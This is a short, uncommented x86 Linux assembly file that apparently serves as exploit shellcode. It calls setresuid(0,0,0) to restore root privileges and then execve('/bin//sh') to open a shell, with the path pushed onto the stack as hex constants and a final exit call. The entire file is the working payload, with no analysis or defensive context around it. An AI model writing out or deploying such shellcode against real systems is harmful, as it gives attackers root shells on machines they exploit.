global _start

section .text

_start:
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	cdq
	mov al,0xa4
	int 0x80
	xor eax,eax
	push eax
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	lea ecx,[esp]
	mov al,0xb
	int 0x80
	xor eax,eax
	mov al,0x1
	int 0x80
